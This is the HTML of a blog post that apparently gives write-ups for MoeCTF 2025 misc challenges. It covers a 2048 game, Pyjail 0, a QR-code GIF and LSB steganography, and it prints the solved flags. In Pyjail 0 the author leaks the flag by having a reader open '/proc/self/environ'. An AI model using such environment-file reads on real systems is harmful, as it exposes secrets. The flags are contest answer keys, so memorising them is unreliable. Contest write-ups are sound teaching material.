@@ -1,0 +1,3619 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="2025西电CTF新生赛">
+<title>Moectf_2025</title>
+
+<link rel='canonical' href='https://expl0rer.top/p/moectf_2025/'>
+
+<link rel="stylesheet" href="/scss/style.min.84f4364fa3a5758ecded3430d054d555b355a8e9efd1baf1e03c18d73802579f.css"><meta property='og:title' content="Moectf_2025">
+<meta property='og:description' content="2025西电CTF新生赛">
+<meta property='og:url' content='https://expl0rer.top/p/moectf_2025/'>
+<meta property='og:site_name' content='Expl0rer.Ct'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-03T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-06T00:50:58&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/moectf_2025/moectf2025.webp' />
+<meta name="twitter:title" content="Moectf_2025">
+<meta name="twitter:description" content="2025西电CTF新生赛"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://expl0rer.top/p/moectf_2025/moectf2025.webp' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+<div class="loading">
+     
+    <div id="ghost">
+        <div id="red">
+            <div id="pupil"></div>
+            <div id="pupil1"></div>
+            <div id="eye"></div>
+            <div id="eye1"></div>
+            <div id="top0"></div>
+            <div id="top1"></div>
+            <div id="top2"></div>
+            <div id="top3"></div>
+            <div id="top4"></div>
+            <div id="st0"></div>
+            <div id="st1"></div>
+            <div id="st2"></div>
+            <div id="st3"></div>
+            <div id="st4"></div>
+            <div id="st5"></div>
+            <div id="an1"></div>
+            <div id="an2"></div>
+            <div id="an3"></div>
+            <div id="an4"></div>
+            <div id="an5"></div>
+            <div id="an6"></div>
+            <div id="an7"></div>
+            <div id="an8"></div>
+            <div id="an9"></div>
+            <div id="an10"></div>
+            <div id="an11"></div>
+            <div id="an12"></div>
+            <div id="an13"></div>
+            <div id="an14"></div>
+            <div id="an15"></div>
+            <div id="an16"></div>
+            <div id="an17"></div>
+            <div id="an18"></div>
+        </div>
+        <div id="shadow"></div>
+    </div>
+</div>
+
+<style>
+    .loading {
+        position: fixed;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 99;
+        background-color: #f5f5fa;
+        transition: opacity 0.5s ease;
+    }
+	
+      
+#ghost {
+  position: relative;
+  scale: 0.8;
+}
+
+#red {
+  animation: upNDown infinite 1s;
+  position: relative;
+  width: 140px;
+  height: 140px;
+  display: grid;
+  grid-template-columns: repeat(14, 1fr);
+  grid-template-rows: repeat(14, 1fr);
+  grid-column-gap: 0px;
+  grid-row-gap: 0px;
+  grid-template-areas:
+    "a1  a2  a3  a4  a5  top0  top0  top0  top0  a10 a11 a12 a13 a14"
+    "b1  b2  b3  top1 top1 top1 top1 top1 top1 top1 top1 b12 b13 b14"
+    "c1 c2 top2 top2 top2 top2 top2 top2 top2 top2 top2 top2 c13 c14"
+    "d1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 d14"
+    "e1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 e14"
+    "f1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 f14"
+    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
+    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
+    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
+    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
+    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
+    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
+    "st0 st0 an4 st1 an7 st2 an10 an10 st3 an13 st4 an16 st5 st5"
+    "an1 an2 an3 an5 an6 an8 an9 an9 an11 an12 an14 an15 an17 an18";
+}
+
+@keyframes upNDown {
+  0%,
+  49% {
+    transform: translateY(0px);
+  }
+  50%,
+  100% {
+    transform: translateY(-10px);
+  }
+}
+
+#top0,
+#top1,
+#top2,
+#top3,
+#top4,
+#st0,
+#st1,
+#st2,
+#st3,
+#st4,
+#st5 {
+  background-color: red;
+}
+
+#top0 {
+  grid-area: top0;
+}
+
+#top1 {
+  grid-area: top1;
+}
+
+#top2 {
+  grid-area: top2;
+}
+
+#top3 {
+  grid-area: top3;
+}
+
+#top4 {
+  grid-area: top4;
+}
+
+#st0 {
+  grid-area: st0;
+}
+
+#st1 {
+  grid-area: st1;
+}
+
+#st2 {
+  grid-area: st2;
+}
+
+#st3 {
+  grid-area: st3;
+}
+
+#st4 {
+  grid-area: st4;
+}
+
+#st5 {
+  grid-area: st5;
+}
+
+#an1 {
+  grid-area: an1;
+  animation: flicker0 infinite 1s;
+}
+
+#an18 {
+  grid-area: an18;
+  animation: flicker0 infinite 1s;
+}
+
+#an2 {
+  grid-area: an2;
+  animation: flicker1 infinite 1s;
+}
+
+#an17 {
+  grid-area: an17;
+  animation: flicker1 infinite 1s;
+}
+
+#an3 {
+  grid-area: an3;
+  animation: flicker1 infinite 1s;
+}
+
+#an16 {
+  grid-area: an16;
+  animation: flicker1 infinite 1s;
+}
+
+#an4 {
+  grid-area: an4;
+  animation: flicker1 infinite 1s;
+}
+
+#an15 {
+  grid-area: an15;
+  animation: flicker1 infinite 1s;
+}
+
+#an6 {
+  grid-area: an6;
+  animation: flicker0 infinite 1s;
+}
+
+#an12 {
+  grid-area: an12;
+  animation: flicker0 infinite 1s;
+}
+
+#an7 {
+  grid-area: an7;
+  animation: flicker0 infinite 1s;
+}
+
+#an13 {
+  grid-area: an13;
+  animation: flicker0 infinite 1s;
+}
+
+#an9 {
+  grid-area: an9;
+  animation: flicker1 infinite 1s;
+}
+
+#an10 {
+  grid-area: an10;
+  animation: flicker1 infinite 1s;
+}
+
+#an8 {
+  grid-area: an8;
+  animation: flicker0 infinite 1s;
+}
+
+#an11 {
+  grid-area: an11;
+  animation: flicker0 infinite 1s;
+}
+
+@keyframes flicker0 {
+  0%,
+  49% {
+    background-color: red;
+  }
+  50%,
+  100% {
+    background-color: transparent;
+  }
+}
+
+@keyframes flicker1 {
+  0%,
+  49% {
+    background-color: transparent;
+  }
+  50%,
+  100% {
+    background-color: red;
+  }
+}
+
+#eye {
+  width: 40px;
+  height: 50px;
+  position: absolute;
+  top: 30px;
+  left: 10px;
+}
+
+#eye::before {
+  content: "";
+  background-color: white;
+  width: 20px;
+  height: 50px;
+  transform: translateX(10px);
+  display: block;
+  position: absolute;
+}
+
+#eye::after {
+  content: "";
+  background-color: white;
+  width: 40px;
+  height: 30px;
+  transform: translateY(10px);
+  display: block;
+  position: absolute;
+}
+
+#eye1 {
+  width: 40px;
+  height: 50px;
+  position: absolute;
+  top: 30px;
+  right: 30px;
+}
+
+#eye1::before {
+  content: "";
+  background-color: white;
+  width: 20px;
+  height: 50px;
+  transform: translateX(10px);
+  display: block;
+  position: absolute;
+}
+
+#eye1::after {
+  content: "";
+  background-color: white;
+  width: 40px;
+  height: 30px;
+  transform: translateY(10px);
+  display: block;
+  position: absolute;
+}
+
+#pupil {
+  width: 20px;
+  height: 20px;
+  background-color: blue;
+  position: absolute;
+  top: 50px;
+  left: 10px;
+  z-index: 1;
+  animation: eyesMovement infinite 6s;
+}
+
+#pupil1 {
+  width: 20px;
+  height: 20px;
+  background-color: blue;
+  position: absolute;
+  top: 50px;
+  right: 50px;
+  z-index: 1;
+  animation: eyesMovement infinite 6s;
+}
+
+@keyframes eyesMovement {
+  0%,
+  49% {
+    transform: translateX(0px);
+  }
+  50%,
+  99% {
+    transform: translateX(10px);
+  }
+  100% {
+    transform: translateX(0px);
+  }
+}
+
+#shadow {
+  background-color: black;
+  width: 140px;
+  height: 140px;
+  position: absolute;
+  border-radius: 50%;
+  transform: rotateX(80deg);
+  filter: blur(20px);
+  top: 80%;
+  animation: shadowMovement infinite 1s;
+}
+
+@keyframes shadowMovement {
+  0%,
+  49% {
+    opacity: 0.5;
+  }
+  50%,
+  100% {
+    opacity: 0.2;
+  }
+}
+
+</style>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>
+
+<script>	
+    function initLoading() {
+        let loading = document.querySelector(".loading");
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            setTimeout(() => {
+                loading.style.opacity = "0";
+                
+                setTimeout(() => {
+                    loading.style.display = "none";
+                }, 500);
+            }, 500); 
+        });
+    }
+
+    initLoading();
+</script>
+
+
+<link
+  rel="stylesheet"
+  href="https://cdn-font.hyperos.mi.com/font/css?family=MiSans:400:Chinese_Simplify,Latin&display=swap"
+/>
+
+
+
+<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreen.css" />
+
+<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreenr.css" />
+
+<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreen.css" />
+
+<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreenr.css" />
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_1a3c99934e119e1b.png" width="300"
+                            height="268" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🫡</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Expl0rer.Ct</a></h1>
+            <h2 class="site-description">吾将上下而求索</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/695179979?spm_id_from=333.40138.0.0'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Expl0rer-Ct'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页 | Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E-about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于 | About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档 | Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索 | Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>技术链接 | Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends-links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接 | Friends Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <!--
+tags: [temperature, hot, wheater, thermometer, forecast]
+category: Weather
+version: "1.73"
+unicode: "f236"
+-->
+<svg
+  xmlns="http://www.w3.org/2000/svg"
+  width="32"
+  height="32"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="#ff9500"
+  stroke-width="1"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  class="icon-tabler-sun-high"
+>
+  <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" />
+  <path d="M6.343 17.657l-1.414 1.414" />
+  <path d="M6.343 6.343l-1.414 -1.414" />
+  <path d="M17.657 6.343l1.414 -1.414" />
+  <path d="M17.657 17.657l1.414 1.414" />
+  <path d="M4 12h-2" />
+  <path d="M12 4v-2" />
+  <path d="M20 12h2" />
+  <path d="M12 20v2" />
+</svg>
+
+                        <!--
+tags: [night, dark mode]
+category: Weather
+version: "1.21"
+unicode: "ece7"
+-->
+<svg
+  xmlns="http://www.w3.org/2000/svg"
+  width="32"
+  height="32"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="#8d6e63"
+  stroke-width="1"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  class="icon-tabler-moon-stars"
+>
+  <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+  <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2" />
+  <path d="M19 11h2m-1 -1v2" />
+</svg>
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#安全杂项">安全杂项</a>
+      <ol>
+        <li><a href="#2048_master">2048_master</a></li>
+        <li><a href="#misc入门指北">Misc入门指北</a></li>
+        <li><a href="#pyjail-0">Pyjail 0</a></li>
+        <li><a href="#rush">Rush</a></li>
+        <li><a href="#ez_lsb">ez_LSB</a></li>
+        <li><a href="#ez_锟斤拷">ez_锟斤拷????</a></li>
+        <li><a href="#weird_photo">weird_photo</a></li>
+        <li><a href="#sstv">SSTV</a></li>
+        <li><a href="#encrypted_pdf">encrypted_pdf</a></li>
+        <li><a href="#哈基米难没露躲">哈基米难没露躲</a></li>
+        <li><a href="#捂住一只耳">捂住一只耳</a></li>
+        <li><a href="#enchantment">Enchantment</a></li>
+        <li><a href="#webrepo">WebRepo</a></li>
+        <li><a href="#ez_ssl">ez_ssl</a></li>
+        <li><a href="#万里挑一">万里挑一</a></li>
+        <li><a href="#ez_png">ez_png</a></li>
+      </ol>
+    </li>
+    <li><a href="#密码学">密码学</a></li>
+    <li><a href="#二进制漏洞审计">二进制漏洞审计</a>
+      <ol>
+        <li><a href="#二进制漏洞审计入门指北">二进制漏洞审计入门指北</a></li>
+        <li><a href="#1-ez_u64">1 ez_u64</a></li>
+        <li><a href="#1-find-it">1 find it</a></li>
+        <li><a href="#2-eztext">2 EZtext</a></li>
+        <li><a href="#2-ezshellcode">2 ezshellcode</a></li>
+        <li><a href="#3-认识libc">3 认识libc</a></li>
+        <li><a href="#boom">boom</a></li>
+        <li><a href="#fmt">fmt</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/moectf_2025/">
+                <img src="/p/moectf_2025/moectf2025_hu_9cab39b13a26931d.webp"
+                        srcset="/p/moectf_2025/moectf2025_hu_9cab39b13a26931d.webp 800w, /p/moectf_2025/moectf2025_hu_9910d56612ef590a.webp 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post Moectf_2025" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/xdctf/" style="background-color: #2a9d8f; color: #fff;">
+                XDCTF
+            </a>
+        
+            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
+                CTF_writeup
+            </a>
+        
+            <a href="/categories/ctfmisc/" style="background-color: #2a9d8f; color: #fff;">
+                CTFmisc
+            </a>
+        
+            <a href="/categories/ctfpwn/" style="background-color: #2a9d8f; color: #fff;">
+                CTFpwn
+            </a>
+        
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9B/" style="background-color: #2a9d8f; color: #fff;">
+                网络安全比赛
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/moectf_2025/">Moectf_2025</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            2025西电CTF新生赛
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-11-03</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>前言：等了好久终于来更新了moectf2025的WP了，欢迎师傅来交流</p>
+<p><a class="link" href="https://ctf.xidian.edu.cn/"  target="_blank" rel="noopener"
+    >西电 CTF 终端</a></p>
+<p>[TOC]</p>
+<h2 id="安全杂项">安全杂项
+</h2><p><a class="link" href="miscru_men_zhi_bei_.pdf" >miscru_men_zhi_bei_.pdf</a></p>
+<h3 id="2048_master">2048_master
+</h3><p>大家都是2048高手吧，出题人准备了一点小礼物哦，玩玩游戏就能拿到flag^_^</p>
+<p>一个简易的win32界面的2048小游戏，键盘上下左右移动：</p>
+<p><img src="/p/moectf_2025/1.png"
+	width="1405"
+	height="536"
+	srcset="/p/moectf_2025/1_hu_e31dd2b286e77054.png 480w, /p/moectf_2025/1_hu_1b5077b310e607e7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="262"
+		data-flex-basis="629px"
+	
+></p>
+<p>打开文件运行游戏，随便乱按“上下左右”键，运行完会发现桌面多出了一个文件，里面这是个布局。每格的数字代表了2的多少次方，最下面是分数。</p>
+<p>moectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu}</p>
+<h3 id="misc入门指北">Misc入门指北
+</h3><p>这题我直接引用官方WP的图片</p>
+<p><img src="/p/moectf_2025/2.png"
+	width="1753"
+	height="1009"
+	srcset="/p/moectf_2025/2_hu_26e5994e546c285a.png 480w, /p/moectf_2025/2_hu_1db88f57bafdacab.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="416px"
+	
+></p>
+<p>全局搜索flag</p>
+<p>moectf{We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!}</p>
+<h3 id="pyjail-0">Pyjail 0
+</h3><hr>
+<p>A simple reader <del>(所以严格来说这题不算 Pyjail)</del></p>
+<p>你可以<a class="link" href="https://ctf.xidian.edu.cn/wiki/13"  target="_blank" rel="noopener"
+    >使用 netcat</a> 或 pwntools（参考二进制漏洞审计入门指北）连接到本题和后续 Pyjail 题的环境。</p>
+<p>关于验证码，示例：Please enter the reverse of &lsquo;GZUUAOIS&rsquo; to continue: SIOAUUZG</p>
+<p>至于 flag 的位置？你可以参考 Web 第十二章（</p>
+<hr>
+<p>根据题⽬描述flag位置参考web⼗⼆章，读取环境变量<code>/proc/self/environ</code>，这题我是请教Web手的，触及我的知识盲区了&hellip;</p>
+<p>nc连接好后，输入<code>/proc/self/environ</code>给它就会吐flag了。</p>
+<p><img src="/p/moectf_2025/3.png"
+	width="1480"
+	height="760"
+	srcset="/p/moectf_2025/3_hu_5e1f13bafd003b14.png 480w, /p/moectf_2025/3_hu_2db47fa5b0a1387d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<h3 id="rush">Rush
+</h3><hr>
+<p>“冲刺，冲刺！”你正走在路上，耳边传来这样的声音，还没反应过来，就被撞倒了。</p>
+<p>你费劲地爬起来，好像看到了什么信息，回过神来那人早已扬长而去，那我缺的这个道歉这块？</p>
+<p><del>上述文案纯属看图说话，玩个梗，无恶意</del></p>
+<hr>
+<p><img src="/p/moectf_2025/rush.gif"
+	width="512"
+	height="512"
+	srcset="/p/moectf_2025/rush_hu_e8e878552c537623.gif 480w, /p/moectf_2025/rush_hu_83027092e5d5294c.gif 1024w"
+	loading="lazy"
+	
+		alt="rush"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="100"
+		data-flex-basis="240px"
+	
+></p>
+<p>硬着头皮用手机扫也行（你手机能扫到就好），当然手机扫不了就抽帧来扫，工具很多，我这里用puzzlesolver：</p>
+<p><img src="/p/moectf_2025/4.png"
+	width="1184"
+	height="305"
+	srcset="/p/moectf_2025/4_hu_1e3c38d07883c40d.png 480w, /p/moectf_2025/4_hu_49e9ed5ccce2b15c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="388"
+		data-flex-basis="931px"
+	
+></p>
+<img src="5.png" style="zoom:80%;" />
+<p>用QR_research工具去扫码：</p>
+<p><img src="/p/moectf_2025/6.png"
+	width="1193"
+	height="700"
+	srcset="/p/moectf_2025/6_hu_8381f0385ce9238f.png 480w, /p/moectf_2025/6_hu_1ee3302d984d703a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="170"
+		data-flex-basis="409px"
+	
+></p>
+<p>moectf{QR_C0d3s_feATUR3_eRror_c0RRECt10N}</p>
+<h3 id="ez_lsb">ez_LSB
+</h3><hr>
+<p>这是一张普通的图片，但是一个个像素看过去似乎有些蹊跷？</p>
+<hr>
+<p><img src="/p/moectf_2025/xidian.png"
+	width="576"
+	height="575"
+	srcset="/p/moectf_2025/xidian_hu_18ad43c54a0de492.png 480w, /p/moectf_2025/xidian_hu_623826f16089ba7d.png 1024w"
+	loading="lazy"
+	
+		alt="xidian"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="100"
+		data-flex-basis="240px"
+	
+></p>
+<p>看题目就知道，这应该是LSB隐写，用stegsolve分析看看：</p>
+<p><img src="/p/moectf_2025/7.png"
+	width="706"
+	height="476"
+	srcset="/p/moectf_2025/7_hu_a8a4c5687cb388de.png 480w, /p/moectf_2025/7_hu_cf778cef9ec981aa.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="355px"
+	
+></p>
+<p>这里有一些不规则的色条，应该是非法插入字符串导致排布不一，过滤Red 0通道</p>
+<p><img src="/p/moectf_2025/8.png"
+	width="890"
+	height="606"
+	srcset="/p/moectf_2025/8_hu_2b75e0c9ec7d10bf.png 480w, /p/moectf_2025/8_hu_4c943507cd1ad81f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="146"
+		data-flex-basis="352px"
+	
+></p>
+<p>bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9</p>
+<p>用Cyberchef进行base64解码：</p>
+<p><img src="/p/moectf_2025/9.png"
+	width="1310"
+	height="546"
+	srcset="/p/moectf_2025/9_hu_c17fc888451b883c.png 480w, /p/moectf_2025/9_hu_4fb1c9672ac17702.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="575px"
+	
+></p>
